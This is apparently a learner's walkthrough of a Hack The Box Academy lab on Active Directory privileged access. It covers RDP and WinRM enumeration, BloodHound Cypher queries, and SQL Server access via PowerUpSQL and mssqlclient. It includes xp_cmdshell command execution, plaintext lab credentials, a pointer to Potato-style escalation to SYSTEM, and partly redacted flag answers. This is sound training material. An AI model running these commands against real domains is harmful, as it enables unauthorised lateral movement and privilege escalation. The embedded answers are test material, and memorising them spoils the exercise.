### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Privileged Access <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Privileged Access

If you don't have local admin yet, look for: `RDP`, `WinRM` (PSRemoting), or `SQL sysadmin` access. BloodHound edges:

| Edge | Access Type |
|---|---|
| `CanRDP` | RDP |
| `CanPSRemote` | WinRM / PSRemoting |
| `SQLAdmin` | sysadmin on a SQL Server instance |

<br>

---

<br>

### Remote Desktop

Enumerate Remote Desktop Users group via PowerView:

```diff
+ PS> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

<br>

If `Domain Users` is in there → all users get RDP to that host. Common on RDS / jump boxes.

BloodHound: search user → `Node Info → Execution Rights → Group Delegated RDP Privileges`. Pre-built queries: `Find Workstations where Domain Users can RDP` / `Find Servers where Domain Users can RDP`.

Connect: `xfreerdp` / `Remmina` / `mstsc.exe`.

<br>

---

<br>

### WinRM

Enumerate Remote Management Users group:

```diff
+ PS> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

<br>

BloodHound custom Cypher for WinRM access:

```diff
+ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

<br>

From Windows: `Enter-PSSession`:

```diff
+ PS> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+ PS> $cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+ PS> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

<br>

From Linux: `evil-winrm`:

```diff
+ $ gem install evil-winrm
+ $ evil-winrm -i 10.129.201.234 -u forend
```

<br>

---

<br>

### SQL Server Admin

Often find SQL creds via Kerberoast, LLMNR/NBT-NS poisoning, password spray, or Snaffler hits on `web.config` connection strings.

BloodHound Cypher for SQL Admin paths:

```diff
+ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

<br>

PowerUpSQL: find instances + run queries:

```diff
+ PS> Import-Module .\PowerUpSQL.ps1
+ PS> Get-SQLInstanceDomain
+ PS> Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

<br>

`mssqlclient.py` from Linux:

```diff
+ $ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+ SQL> enable_xp_cmdshell
+ SQL> xp_cmdshell whoami /priv
```

<br>

`xp_cmdshell` runs as the SQL service account: almost always has `SeImpersonatePrivilege`. Combine with `JuicyPotato` / `PrintSpoofer` / `RoguePotato` for SYSTEM.

<br>

---

<br>

### Privileged Access Exercise

IPs: 10.129.139.18 (Win) + 10.129.139.54 (Linux)

RDP Win as `htb-student:Academy_student_AD!`. SSH from Win → 172.16.5.225 with `htb-student:HTB_@cademy_stdnt!`.

---

### Question 1:
What other user in the domain has CanPSRemote rights to a host?

#### RDP with shared dir, run SharpHound -c All, ingest into BloodHound, run the CanPSRemote Cypher query.

```diff
+ $ mkdir mspaint
+ $ xfreerdp /v:10.129.139.18 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution /drive:mspaint,/home/htb-ac-830862/mspaint/
+ PS> cd c:\Tools
+ PS> ./SharpHound.exe -c All --zipfilename ad_blood
+ PS> cd Bloodhound-GUI; ./Bloodhound.exe
```

<br>

Raw Query:

```diff
+ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

&#x1F6A9; found **bda--edit--**.

---

### Question 2:
What host can this user access via WinRM? (just the computer name)

#### From the BloodHound graph: bdavis can WinRM to the DC.

&#x1F6A9; found **ACADEMY-EA-DC--edit--**.

---

### Question 3:
Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.

#### SSH to the Linux jump host. Auth to MSSQL with damundsen via mssqlclient.py, enable xp_cmdshell, type the flag.

```diff
+ PS> ssh htb-student@172.16.5.225
+ $ mssqlclient.py 'INLANEFREIGHT/DAMUNDSEN:SQL1234!@172.16.5.150' -windows-auth
+ SQL> enable_xp_cmdshell
+ SQL> xp_cmdshell type c:\Users\damundsen\Desktop\flag.txt
```

&#x1F6A9; found **1m_the_sQl_@dm--edit--n_n0w!**.
